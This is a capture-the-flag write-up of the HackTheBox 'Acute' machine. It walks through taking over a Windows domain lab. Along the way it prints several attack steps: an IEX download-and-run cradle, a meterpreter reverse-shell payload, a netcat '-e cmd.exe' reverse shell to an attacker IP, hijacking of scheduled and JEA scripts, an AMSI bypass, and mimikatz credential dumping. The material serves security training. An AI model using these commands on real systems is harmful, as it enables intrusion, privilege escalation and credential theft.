# HackTheBox-Acute

## NMAP

```bash
PORT    STATE SERVICE  VERSION                                         
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Issuer: commonName=acute-ATSSERVER-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-06T06:34:58
| Not valid after:  2030-01-04T06:34:58
| MD5:   cf3a d387 8ede 75cf 89c1 8806 0b6b c823
|_SHA-1: f954 d677 0cf3 54df 3fa2 ed4f 78c3 1902 c120 a368
|_ssl-date: 2022-02-13T14:22:11+00:00; -3s from scanner time.
| tls-alpn: 
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: -3s

```

Surprisingly this box has only one port open which is port 443

## PORT 443 (HTTPS)

Visiting the web server we'll get 404 status code

<img src="https://i.imgur.com/VA5rYRj.png"/>

From the nmap scan we can see the domain name `atsserver.acute.local` so let's add this to `/etc/hosts` file

<img src="https://i.imgur.com/eOHefdN.png"/>

After adding the domain and accessing it we can see a web page

<img src="https://i.imgur.com/4uCqybc.png"/>

We can see from the wappalyzer browser extensions that the web page is using wordpress

<img src="https://i.imgur.com/KYTmeGk.png"/>

Clicking on the courses it will just give us a 404 status code as the page doesn't exist

<img src="https://i.imgur.com/tJ1EWN6.png"/>

Running `dirsearch` to fuzz for files and directories didn't revealed anything interesting

<img src="https://i.imgur.com/ys8FTau.png"/>

Viewing the about me section we'll see a link to a word document

<img src="https://i.imgur.com/FqF8mbQ.png"/>

On opening that we'll see two links but those link would give a 404 status code

<img src="https://i.imgur.com/WR3CvfU.png"/>

<img src="https://i.imgur.com/zYLCkSG.png"/>

Scrolling down we can see a password `Password1!` and a url to access `Windows PowerShell Web Access`

<img src="https://i.imgur.com/HGsfZzs.png"/>
    
<img src="https://i.imgur.com/L9mYtn3.png"/>

I tried this password for `Lois` as at the end of the document we can see that he is allowed to change group member permissions

<img src="https://i.imgur.com/YTvZ6gn.png"/>

<img src="https://i.imgur.com/36xD5M6.png"/>

But it failed , going back to about me section we can see some user names

<img src="https://i.imgur.com/AuLjNrq.png"/>

Now we don't know what's the username also we don't know the name of the computer , so running `exiftool` on the word document

<img src="https://i.imgur.com/2iSmeZQ.png"/>

This reveals the computer name which is `Acute-PC01`. I tried `FCastle` as a username with the password that we have got but it didn't worked , I went on trying the usernames that we have found on the about section and `EDavies` worked

<img src="https://i.imgur.com/xukH72c.png"/>

<img src="https://i.imgur.com/BgGinhc.png"/>

We got a powershell session through browser but it seems like we are in a container because the IP is `172.16.22.2` , running `net user` command to check in which groups we are in , it gives an error that this user doesn't exist

<img src="https://i.imgur.com/DUAcY3o.png"/>

We can try to scan `172.16.22.1` as it's the gateway and may have some interesting ports open, since we can't really install nmap on this machine we could try using a powershell script for scanning ports

https://github.com/JustinGrote/PoshNmap

<img src="https://i.imgur.com/oZB4dPN.png"/>

After transferring if we'll try running the powershell script, it won't allow us as it's disable to run scripts

<img src="https://i.imgur.com/vo5mP8i.png"/>

We can try downloading it through `IEX` which imports the script in the memory 

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.56:2222/powershell-nmap.ps1')

```

<img src="https://i.imgur.com/tsbKS0n.png"/>

<img src="https://i.imgur.com/L8We7sd.png"/>

The ports that it shows are dns,smb,winrm and ldap which could mean this maybe a domain controller, I wasn't able to specify the script to scan port 88 so I moved on

In Users directory we can see few users but we don't have permissions to view the contents

<img src="https://i.imgur.com/R7mAIie.png"/>

Going into `C` drive we see a folder named `Utils` it shows that doesn't have any files

<img src="https://i.imgur.com/DIGnTxd.png"/>

On viewing the hidden files with `dir -Force` we can see a ini file

<img src="https://i.imgur.com/LOE2p1e.png"/>

Which shows that it  windows defender doesn't check this directory for malicious files maybe ,whitelisted directory can also be found by looking at the defender's exlcusioin key

https://petri.com/microsoft-defender-exclusions-list-windows-10/

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s

```

<img src="https://i.imgur.com/EGKXjtI.png"/>

so first we need to generate a `msfvenom` payload for `meterpreter`

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=2222 -f exe > shell.exe
```
 
 <img src="https://i.imgur.com/4XZh9Aw.png"/>




 Now to host this payload using python3


 
 <img src="https://i.imgur.com/mEbkwIZ.png"/>
  
 <img src="https://i.imgur.com/5C2X7BG.png"/>




<img src="https://i.imgur.com/v2XWjh0.png"/>

Checking our meterpreter listener, we'll get a shell 

<img src="https://i.imgur.com/ikQdQPA.png"/>


Having a meterpreter session , I spawned powershell to download `chisel` so I can try scanning the gateway through socks5 proxy 

<img src="https://i.imgur.com/6cqAWlu.png"/>

<img src="https://i.imgur.com/crrXmjh.png"/>

Make sure to add `socks 5 127.0.0.1 1080` in `/etc/proxychains.conf`

<img src="https://i.imgur.com/iKWcWdM.png"/>

<img src="https://i.imgur.com/zTxvVzF.png"/>

And this shows that it really is the domain controller as kerberos is running

I enumerated the whole container but there wasn't anything interesting , after running winpeas on the container it should that there was 1 RDP session active

<img src="https://i.imgur.com/yioPPkN.png"/>


<img src="https://i.imgur.com/sWBRUFI.png"/>

This could also been found through `query user` which lists the active login sessions

<img src="https://i.imgur.com/ciBKvpZ.png"/>


Using a feature of meterpreter to use `screenshare` we can see the GUI of the windows machine and there was script running which was connecting to the actual host machine with the credentials `imonks:W3_4R3_th3_f0rce.`

<img src="https://i.imgur.com/9oTZTFq.png"/>

<img src="https://i.imgur.com/v2XJ74i.png"/>

<img src="https://i.imgur.com/5liCcU4.png"/>

We need to make a credential and secure password string object 

```powershell
$pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
```

```powershell
$credential = New-Object System.Management.Automation.PSCredential('acute\imonks',$pass)
```

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock { whoami } -Credential $credential
```

<img src="https://i.imgur.com/DseFB9w.png"/>

But we can only run limited commands

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock { Get-Command } -Credential $credential
```

<img src="https://i.imgur.com/9KoSbS3.png"/>

We can run `Get-Alias` to see the shortcut of these commands

<img src="https://i.imgur.com/FNr7glp.png"/>

In `imonks` directory we see a powershell script `wm.ps` 

<img src="https://i.imgur.com/Ssfgufe.png"/>

<img src="https://i.imgur.com/4m2bns8.png"/>

This script is using `actue\jmorgan`'s secure password to run `Get-Volume` on the container that we have a web based powershell so what if we made it to execute our payload in `C:\Utils` which will give us a reverse shell 

To do this we can use powershell's cmdlet `Get-Content` and `Set-Content`

https://mcpmag.com/articles/2018/08/08/replace-text-with-powershell.aspx

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock { (Get-Content -path C:\Users\imonks\Desktop\wm.ps1) -replace 'Get-Volume','cmd.exe /c C:\Utils\uwu.exe'  } -Credential $credential
```

With this command we can replace `Get-Volume` in the script to our payload but it won't be written out to a file it will just output on the powershell

<img src="https://i.imgur.com/y7qCKiG.png"/>

So with `Set-Content` we can write the output to the file itself and then run the powershell script

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock { ((Get-Content -path C:\Users\imonks\
Desktop\wm.ps1) -replace 'Get-Volume','cmd.exe /c C:\Utils\uwu.exe') | Set-Content -Path C:\Users\imonks\Desktop\wm.ps1
 } -Credential $credential
```

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock { C:\Users\imonks\Desktop\wm.ps1 } -Credential $credential
```

<img src="https://i.imgur.com/xeTAN9e.png"/>

<img src="https://i.imgur.com/8v74IIE.png"/>

After getting `jmorgan` we can check this user's privileges with `getprivs` or if we want to use cmd we can use `whoami /all` 

<img src="https://i.imgur.com/YgdvkHi.png"/>

<img src="https://i.imgur.com/sxXSnkM.png"/>


Through this privilege we can become SYSTEM user on the container by running `getsystem` and then can dump NTLM hashes on the container

<img src="https://i.imgur.com/a0X06yA.png"/>

Grabbing Administrator's and Natasha's hash we can check if they are crackable , using `crackstation` we can crack the administrator's hash and get the password `Password@123`

<img src="https://i.imgur.com/HBZLnqy.png"/>

On ATSSERVER we have 3 users that we can try this password , `Administrator `, `lhopkins` and `awallace`.

<img src="https://i.imgur.com/fDX5Wvo.png"/>

I tried for lhopkins but it failed, moving on to awallace

<img src="https://i.imgur.com/PrnT3jO.png"/>

it worked for awallace but still we have limited commands that we can run on the ATSSERVER

<img src="https://i.imgur.com/0JX0XKF.png"/>

We don't actually see anything other than `keepmeon` folder in `C:\Program Files` 

<img src="https://i.imgur.com/bBGux1M.png"/>

There's a bat file in that folder

<img src="https://i.imgur.com/X2LbuuW.png"/>

Reading the contents of this bat file

<img src="https://i.imgur.com/FyfSD0l.png"/>

```powershell
REM This is run every 5 minutes. For Lois use ONLY
@echo off
 for /R %%x in (*.bat) do (
 if not "%%x" == "%~0" call "%%x"
)
```

Now analyzing this batch script , here there's a loop running , `/R` meaning that it loops through files in the current directory and looks for `.bat` file and then it will `call` that file if found , it also mentions that this batch script runs as `lhopkins(Lois)` user 

Going back to that word document it mentions about Lois the only user to group membership also that only he can become `site admin`

<img src="https://i.imgur.com/HresUg2.png"/>

Running `net group /domain` we can see a group named `Site_Admin`

<img src="https://i.imgur.com/Hsc0Dlb.png"/>

Checking the description of this group it says that it has access to domain admin group

<img src="https://i.imgur.com/G79GHIg.png"/>

So using `Set-Content` we can add the command `net group Site_Admin "awallace" /add /domain` to add this user to Site_Admin group 

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock { Set-Content "C:\Program Files\keepmeon\uwu.bat" -Value ‘net group Site_Admin "awallace" /add /domain’ } -Credential $credential
```

<img src="https://i.imgur.com/4i9gwUp.png"/>

Checking the groups in which awallace is in we can see that he has been added to `Site_Admin`

<img src="https://i.imgur.com/YTslSod.png"/>

Being in this group we can access the `Administrator`'s directory and get the root flag

<img src="https://i.imgur.com/38gGYOs.png"/>

Even tho this is where the box ends but I wanted to see if we can get dump the hashes so having the chisel socks proxy running , I tried using `secretsdump.py` using awallace's credentials as we are in site_admin group which is an alias for domain admin group 

<img src="https://i.imgur.com/Gtr3I51.png"/>

It didn't allow authenticating with credentials, so instead I tried generate a TGT for the user and used the script with kerberos authenitcaiton

<img src="https://i.imgur.com/WE0VGtZ.png"/>
Now exporting this `KRB5CCNAME` variable

<img src="https://i.imgur.com/8EIqgUt.png"/>

But this again kept failing 

<img src="https://i.imgur.com/f8dTELR.png"/>

<img src="https://i.imgur.com/j9ml3qQ.png"/>

I got back to awallace and tried getting a reverse shell and the way we can do this as we have limited commands to execute we can't directly just make a request to our server to download nc or anything so instead we can use environmental variables so store any command also we can use (backtick)r(backtick)n for new line in a string

https://shellgeek.com/how-to-add-newline-to-string-or-variable/

Also throughout the box I used `Invoke-Command` with the computer name which was creating an adhoc session for remote powershell session on ATSSERVER which means that as soon as the commands get exited it would just clear our session meaning if we create environmental variables they will be removed so for creating a persistant session we can use `New-PSSession

https://devops-collective-inc.gitbook.io/secrets-of-powershell-remoting/session-management

Keeping awallace's credentials

```powershell
$sess = New-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $credential
```

<img src="https://i.imgur.com/Zm93Pks.png"/>

```powershell

This file downloads the nc64.exe (make sure to get 1.12 as the defender removes the previous one)

Invoke-Command -Session $sess -ScriptBlock { $var1 = "powershell.exe -c Invoke-WebRequest 'http://10.10.14.61:3333/nc64.exe' -OutFile 'nc64.exe' `r`n "  }


This command will be executed after nc64.exe is downloaded

Invoke-Command -Session $sess -ScriptBlock { $var2 = "nc64.exe 10.10.14.61 5555 -e cmd.exe `r`n " }


This will write the values of both variables in the bat file

Invoke-Command -Session $sess -ScriptBlock { Set-Content -Path "C:\Program Files\keepmeon\uwu.bat" -Value $var1,$var2 }
```

<img src="https://i.imgur.com/qQmGrR1.png"/>


<img src="https://i.imgur.com/YFyz3Id.png"/>

Since `lhopkins` has rights to add members in Site_admin group we can him in this group which has the same privilege as Domain Admins group

<img src="https://i.imgur.com/id4scsz.png"/>

Here we can't just use mimikatz powershell script to dump hashes because of AMSI but we can bypass it by using `Invoke-OneShot` script which will import mimikatz at the same time 

https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093

Make sure to have mimikatz script on your local machine and change the location of the script to your IP

<img src="https://i.imgur.com/kyBfIcJ.png"/>

<img src="https://i.imgur.com/hyDTJpj.png"/>

<img src="https://i.imgur.com/a2IkYLg.png"/>

<img src="https://i.imgur.com/oUSWFOy.png"/>

This dumped LSASS, we can also dump NTDS.dit with `lsadump::dcsync /domain:acute.local /all`

<img src="https://i.imgur.com/eLowN6z.png"/>

<img src="https://i.imgur.com/JY0u6Ii.png"/>

<img src="https://i.imgur.com/1ROgkil.png"/>



## References

- https://github.com/JustinGrote/PoshNmap
- https://4sysops.com/archives/using-a-local-variable-in-a-remote-powershell-session/
- http://woshub.com/using-powershell-just-enough-administration-jea/
- https://petri.com/microsoft-defender-exclusions-list-windows-10/
- https://mcpmag.com/articles/2018/08/08/replace-text-with-powershell.aspx
- https://ss64.com/nt/for_r.html
- https://techgenix.com/output-contents-to-a-file-powershell/
- https://shellgeek.com/how-to-add-newline-to-string-or-variable/
- https://devops-collective-inc.gitbook.io/secrets-of-powershell-remoting/session-management
- https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093
